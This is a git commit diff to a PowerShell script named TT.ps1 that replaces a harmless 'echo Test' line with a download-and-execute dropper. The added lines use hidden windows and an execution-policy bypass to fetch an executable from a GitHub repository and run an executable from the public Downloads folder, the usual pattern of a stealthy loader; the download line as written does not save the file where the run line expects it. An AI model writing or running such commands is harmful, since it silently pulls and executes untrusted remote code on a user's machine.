a3fa275b4f0aa08e54a456306b658e2d9152f0a5
AmjadBalls <155375827+AmjadBalls@users.noreply.github.com>
2024-12-17 14:32:37 +0200

    Update TT.ps1

--- TT.ps1
+++ TT.ps1
@@ -1,1 +1,2 @@
-echo Test
+powershell -WindowStyle Hidden -ep bypass iwr -uri https://github.com/AmjadBalls/TEST/raw/refs/heads/main/Test.exe
+powershell.exe -w hidden C:\Users\Public\Downloads\Test.exe
